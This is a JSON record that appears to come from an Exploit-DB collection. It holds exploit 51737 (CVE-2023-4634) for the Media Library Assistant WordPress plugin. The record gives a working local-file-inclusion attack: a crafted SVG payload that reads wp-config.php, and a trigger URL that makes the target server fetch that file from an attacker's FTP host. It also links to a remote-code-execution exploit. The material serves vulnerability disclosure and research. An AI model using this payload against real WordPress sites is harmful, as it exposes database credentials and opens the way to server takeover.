{"source": "https://www.exploit-db.com/exploits/51737", "vulnName": "Media Library Assistant Wordpress Plugin - RCE and LFI", "vulnEDBID": "51737", "vulnCVE": "2023-4634", "author": "FLORENT MONTEL", "exploitType": "WEBAPPS", "platform": "PHP", "datePublished": "2023-10-09", "vulnContent": "# Exploit Title: Media Library Assistant Wordpress Plugin - RCE and LFI \n# Date: 2023/09/05\n# CVE: CVE-2023-4634\n# Exploit Author: Florent MONTEL / Patrowl.io / @Pepitoh / Twitter @Pepito_oh\n# Exploitation path: https://patrowl.io/blog-wordpress-media-library-rce-cve-2023-4634/\n# Exploit: https://github.com/Patrowl/CVE-2023-4634/\n# Vendor Homepage: https://fr.wordpress.org/plugins/media-library-assistant/\n# Software Link: https://fr.wordpress.org/plugins/media-library-assistant/\n# Version: < 3.10\n# Tested on: 3.09\n# Description:\n# Media Library Assistant Wordpress Plugin in version < 3.10 is affected by an unauthenticated remote reference to Imagick() conversion which allows attacker to perform LFI and RCE depending on the Imagick configuration on the remote server. The affected page is: wp-content/plugins/media-library-assistant/includes/mla-stream-image.php\n\n\n#LFI\n\nSteps to trigger conversion of a remote SVG\n\nCreate a remote FTP server at ftp://X.X.X.X:21 (http will not work, see references)\n\nHost 2 files :\n- malicious.svg\n- malicious.svg[1]\n\n\nPayload:\nFor LFI, getting wp-config.php:\n\nBoth malicious.svg and malicious.svg[1] on the remote FTP:\n\n<svg width=\"500\" height=\"500\"\nxmlns:xlink=\"http://www.w3.org/1999/xlink\">\nxmlns=\"http://www.w3.org/2000/svg\">\n<image xlink:href= \"text:../../../../wp-config.php\" width=\"500\" height=\"500\" />\n</svg>\n\nThen trigger conversion with:\nhttp://127.0.0.1/wp-content/plugins/media-library-assistant/includes/mla-stream-image.php?mla_stream_file=ftp://X.X.X.X:21/malicious.svg&mla_debug=log&mla_stream_frame=1\n\n\n# Directory listing or RCE:\nTo achieve Directory listing or even RCE, it is a little more complicated. \n\nUse exploit available here:\nhttps://github.com/Patrowl/CVE-2023-4634/\n\n# Note\nExploitation will depend on the policy.xml Imagick configuration file installed on the remote server. All exploitation paths and scripts have been performed with a default wordpress configuration and installation (Wordpress has high chance to have the default Imagick configuration).\n            "}